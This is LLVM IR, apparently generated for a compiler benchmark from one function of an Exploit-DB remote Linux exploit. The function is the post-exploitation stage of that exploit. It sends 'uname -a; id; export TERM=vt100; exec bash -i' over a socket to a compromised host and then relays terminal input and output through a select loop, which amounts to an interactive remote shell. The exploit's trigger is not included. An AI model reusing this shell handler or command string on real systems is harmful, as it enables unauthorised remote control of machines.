; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_775.c_sh.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_775.c_sh.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [47 x i8] c"uname -a; id; export TERM=vt100; exec bash -i\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [36 x i8] c"[*] Executed shell successfully !\0A\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @sh(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca [1024 x i8], align 16
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str, i64 0, i64 0), i8** %4, align 8
  %7 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %8 = call i32 @memset(i8* %7, i32 0, i32 1024)
  %9 = load i32, i32* @stdout, align 4
  %10 = call i32 (i32, i8*, ...) @fprintf(i32 %9, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0))
  %11 = load i32, i32* %2, align 4
  %12 = load i8*, i8** %4, align 8
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strlen(i8* %13)
  %15 = call i32 @send(i32 %11, i8* %12, i32 %14, i32 0)
  br label %16

16:                                               ; preds = %64, %1
  %17 = load i32, i32* @stdout, align 4
  %18 = call i32 @fflush(i32 %17)
  %19 = call i32 @FD_ZERO(i32* %6)
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @FD_SET(i32 %20, i32* %6)
  %22 = load i32, i32* @STDIN_FILENO, align 4
  %23 = call i32 @FD_SET(i32 %22, i32* %6)
  %24 = load i32, i32* %2, align 4
  %25 = add nsw i32 %24, 1
  %26 = call i32 @select(i32 %25, i32* %6, i32* null, i32* null, i32* null)
  %27 = load i32, i32* %2, align 4
  %28 = call i64 @FD_ISSET(i32 %27, i32* %6)
  %29 = icmp ne i64 %28, 0
  br i1 %29, label %30, label %45

30:                                               ; preds = %16
  %31 = load i32, i32* %2, align 4
  %32 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %33 = call i32 @read(i32 %31, i8* %32, i32 1023)
  store i32 %33, i32* %3, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp sle i32 %34, 0
  br i1 %35, label %36, label %38

36:                                               ; preds = %30
  %37 = call i32 @exit(i32 0) #3
  unreachable

38:                                               ; preds = %30
  %39 = load i32, i32* %3, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 %40
  store i8 0, i8* %41, align 1
  %42 = load i32, i32* @stdout, align 4
  %43 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %44 = call i32 (i32, i8*, ...) @fprintf(i32 %42, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8* %43)
  br label %45

45:                                               ; preds = %38, %16
  %46 = load i32, i32* @STDIN_FILENO, align 4
  %47 = call i64 @FD_ISSET(i32 %46, i32* %6)
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %64

49:                                               ; preds = %45
  %50 = load i32, i32* @STDIN_FILENO, align 4
  %51 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %52 = call i32 @read(i32 %50, i8* %51, i32 1023)
  store i32 %52, i32* %3, align 4
  %53 = load i32, i32* %3, align 4
  %54 = icmp sgt i32 %53, 0
  br i1 %54, label %55, label %63

55:                                               ; preds = %49
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 %57
  store i8 0, i8* %58, align 1
  %59 = load i32, i32* %2, align 4
  %60 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %61 = load i32, i32* %3, align 4
  %62 = call i32 @write(i32 %59, i8* %60, i32 %61)
  br label %63

63:                                               ; preds = %55, %49
  br label %64

64:                                               ; preds = %63, %45
  br label %16
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
